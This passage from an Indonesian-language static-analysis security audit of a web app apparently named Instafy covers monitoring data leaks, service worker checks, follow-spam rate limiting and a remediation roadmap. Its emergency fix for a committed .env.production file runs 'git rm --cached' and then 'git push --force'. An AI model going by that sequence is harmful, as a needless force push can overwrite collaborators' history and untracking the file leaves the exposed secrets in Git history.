export const handler = async (event: any, context: any) => {
  try {
    // Validate event structure
    if (!event || !event.headers) {
      return {
        statusCode: 400,
        body: JSON.stringify({ message: "Invalid request" }),
      };
    }

    const url = `https://${event.headers?.Host ?? "localhost"}${event.rawPath ?? event.path ?? "/"}`;

    const request = new Request(url, {
      method: event.requestContext?.http?.method ?? event.httpMethod ?? "GET",
      headers: new Headers(event.headers ?? {}),
      body: event.body
        ? event.isBase64Encoded
          ? Buffer.from(event.body, "base64")
          : event.body
        : undefined,
    });

    const response = await app.handle(request);
    const responseBody = await response.text();
    const responseHeaders: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });

    return {
      statusCode: response.status,
      headers: responseHeaders,
      body: responseBody,
      isBase64Encoded: false,
    };
  } catch (error: any) {
    // ✅ Log error tapi jangan leak details ke client
    console.error("[Lambda Error]", error);

    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: "Internal server error",
        // ❌ JANGAN include error.stack di production!
      }),
      isBase64Encoded: false,
    };
  }
};
```

---

### 20. 🟠 **Monitoring Endpoint Leak Sensitive Info**

**Severity:** 🟠 HIGH  
**File:** `backend/src/modules/monitoring/monitoring.service.ts`  
**Impact:** Endpoint monitoring bisa leak informasi infrastruktur

**Bukti:**

```typescript
// monitoring.service.ts - Line 8
const status: any = {
  databases: {
    primary: {
      name: "AWS RDS PostgreSQL (Production)", // ⚠️ Leak tech stack
      status: "offline",
      error: null, // ⚠️ Bisa leak error messages
    },
  },
  storage: {
    s3: {
      bucket: env.AWS_S3_BUCKET, // ⚠️ Leak bucket name
      region: env.AWS_S3_REGION, // ⚠️ Leak region
    },
  },
};
```

**Rekomendasi:**

```typescript
// Jangan expose detail infrastruktur ke public
static async checkHealth(simulateDown = false) {
  // ✅ Return generic status saja untuk public
  const publicStatus = {
    status: "operational", // atau "degraded", "down"
    timestamp: new Date().toISOString(),
  };

  // ✅ Detail status hanya untuk admin
  const detailedStatus = {
    timestamp: new Date().toISOString(),
    databases: {
      primary: {
        status: "online",
        latencyMs: 45,
        // ❌ JANGAN include error messages
      },
    },
    // ... rest
  };

  return { public: publicStatus, detailed: detailedStatus };
}
```

---

### 21. 🟡 **Service Worker Tidak Ada Integrity Check**

**Severity:** 🟡 MEDIUM  
**File:** `frontend/public/sw.js`  
**Impact:** Service worker bisa di-hijack untuk phishing

**Rekomendasi:**

```javascript
// sw.js - Tambahkan integrity check
self.addEventListener("install", (event) => {
  console.log("[SW] Installing service worker...");

  // ✅ Verify origin
  if (self.location.origin !== "https://www.ppwl-a3.my.id") {
    console.error("[SW] Invalid origin detected!");
    return;
  }

  event.waitUntil(self.skipWaiting());
});

self.addEventListener("push", (event) => {
  const payload = event.data ? event.data.json() : {};

  // ✅ Validate payload structure
  if (!payload.title || typeof payload.title !== "string") {
    console.error("[SW] Invalid push payload");
    return;
  }

  // ✅ Sanitize notification content
  const title = payload.title.substring(0, 100); // Limit length
  const body = (payload.body || "").substring(0, 200);

  const options = {
    body: body,
    icon: "/favicon/web-app-manifest-192x192.png",
    badge: "/favicon/favicon-96x96.png",
    data: {
      url: payload.url || "/notifications",
    },
  };

  event.waitUntil(self.registration.showNotification(title, options));
});
```

---

### 22. 🟡 **Follow Action Tidak Ada Notification Spam Protection**

**Severity:** 🟡 MEDIUM  
**File:** `backend/src/modules/follow/follow.service.ts`  
**Impact:** User bisa spam follow/unfollow untuk flood notifications

**Rekomendasi:**

```typescript
// Tambahkan rate limiting untuk follow actions
const followActionLimiter = new Map<string, { count: number; resetAt: number }>();

static async followUser(followerId: string, followingId: string) {
  if (followerId === followingId) {
    throw new Error("Tidak bisa follow diri sendiri");
  }

  // ✅ Rate limit: Max 20 follow actions per hour
  const now = Date.now();
  const limiterKey = `follow:${followerId}`;
  const record = followActionLimiter.get(limiterKey);

  if (!record || now > record.resetAt) {
    followActionLimiter.set(limiterKey, { count: 1, resetAt: now + 3600000 });
  } else if (record.count >= 20) {
    throw new Error("Terlalu banyak follow actions. Coba lagi nanti.");
  } else {
    record.count++;
  }

  // ... rest of follow logic
}
```

---

## 📊 Summary Statistics (UPDATED)

| Severity        | Count  | Percentage |
| --------------- | ------ | ---------- |
| 🔥 CATASTROPHIC | 2      | 9%         |
| 🔴 CRITICAL     | 10     | 45%        |
| 🟠 HIGH         | 6      | 27%        |
| 🟡 MEDIUM       | 4      | 18%        |
| 🔵 LOW          | 1      | 5%         |
| **TOTAL**       | **22** | **100%**   |

---

## 🎯 Prioritas Perbaikan (UPDATED ROADMAP)

### 🚨 EMERGENCY (SEKARANG JUGA - DALAM 24 JAM!)

1. 🔥 **HAPUS .env.production dari Git & ROTATE SEMUA CREDENTIALS**
2. 🔥 **DISABLE /data endpoints di production**
3. 🔥 **Ganti API_SECRET_KEY dengan yang kuat**
4. 🔥 **Setup .gitignore untuk semua .env files**
5. 🔥 **Audit Git history untuk credentials lain yang ter-commit**

### Sprint 1 (URGENT - 1-2 Minggu)

1. ✅ Implementasi Rate Limiting (Global & Per-Endpoint)
2. ✅ Input Sanitization (XSS Protection)
3. ✅ Pindahkan Token dari LocalStorage ke HttpOnly Cookie
4. ✅ Fix CORS Configuration
5. ✅ Implementasi Authorization Middleware
6. ✅ Fix Backup Endpoint Security
7. ✅ Implement Cache Size Limits
8. ✅ Lambda Error Boundary

### Sprint 2 (HIGH - 2-3 Minggu)

6. ✅ Password Strength Validation
7. ✅ IDOR Protection Enhancement
8. ✅ File Upload Validation (Magic Number Check)
9. ✅ Generic Error Messages
10. ✅ Refresh Token Mechanism
11. ✅ Story Upload Rate Limiting
12. ✅ Monitoring Endpoint Security

### Sprint 3 (MEDIUM - 1 Bulan)

11. ✅ Account Lockout Mechanism
12. ✅ Content Security Policy
13. ✅ Pusher Authentication Enhancement
14. ✅ Security Logging & Monitoring
15. ✅ Service Worker Integrity Check
16. ✅ Follow Action Rate Limiting

### Sprint 4 (NICE TO HAVE)

15. ✅ Advanced Security Features (2FA, IP Whitelisting, etc.)
16. ✅ Web Application Firewall (WAF)
17. ✅ Intrusion Detection System (IDS)
18. ✅ Security Headers Enhancement
19. ✅ API Gateway dengan AWS API Gateway
20. ✅ DDoS Protection dengan CloudFlare

---

## 🔐 Kesimpulan (UPDATED)

Aplikasi Instafy memiliki **fondasi keamanan yang cukup baik** (Prisma, Bcrypt, JWT), namun ditemukan **2 CELAH CATASTROPHIC** dan **10 CELAH CRITICAL** yang harus segera diperbaiki:

### 🚨 PALING URGENT:

1. **CREDENTIALS EXPOSED** - .env.production ter-commit ke Git dengan semua password & API keys!
2. **ADMIN ENDPOINTS EXPOSED** - Siapa saja dengan API key lemah bisa dump database!

### ⚠️ CRITICAL LAINNYA:

3. **Rate Limiting** - Untuk mencegah brute force & DDoS
4. **Input Sanitization** - Untuk mencegah XSS
5. **Token Storage** - Pindah dari LocalStorage ke HttpOnly Cookie
6. **CORS Configuration** - Untuk mencegah CSRF
7. **Cache Poisoning** - Untuk mencegah DoS via cache exhaustion
8. **Lambda Error Handling** - Untuk mencegah crash & info leak

**TINDAKAN SEGERA:**

```bash
# 1. HAPUS .env.production dari Git SEKARANG!
git rm --cached backend/.env.production
git commit -m "Remove exposed credentials"
git push --force

# 2. ROTATE SEMUA CREDENTIALS:
# - Database password
# - JWT_SECRET
# - Cloudinary API Secret
# - Pusher Secret
# - Web Push Private Key

# 3. DISABLE /data endpoints di production
# Edit backend/src/modules/data/data.route.ts
```

Dengan memperbaiki 2 celah CATASTROPHIC dan 10 celah CRITICAL, aplikasi akan jauh lebih aman dan siap untuk production deployment.

---

**⚠️ DISCLAIMER PENTING:**

Laporan ini dibuat berdasarkan analisis kode statis pada tanggal 29 Mei 2026. Untuk audit keamanan yang lebih komprehensif, **SANGAT DISARANKAN** melakukan:

1. **Penetration Testing** oleh security professional
2. **Dynamic Application Security Testing (DAST)**
3. **Security Code Review** oleh Security Expert
4. **Third-party Security Audit** (seperti Synopsys, Veracode, atau Checkmarx)
5. **Bug Bounty Program** untuk crowdsourced security testing

**Catatan:** File `.env.production` yang ter-commit ke Git adalah **INSIDEN KEAMANAN SERIUS**. Semua credentials yang ter-expose harus segera di-rotate dan Git history harus dibersihkan.

---

**Prepared by:** Kiro AI Security Analysis  
**Date:** 29 Mei 2026  
**Version:** 2.0 (Updated with CATASTROPHIC findings)  
**Status:** 🚨 URGENT ACTION REQUIRED
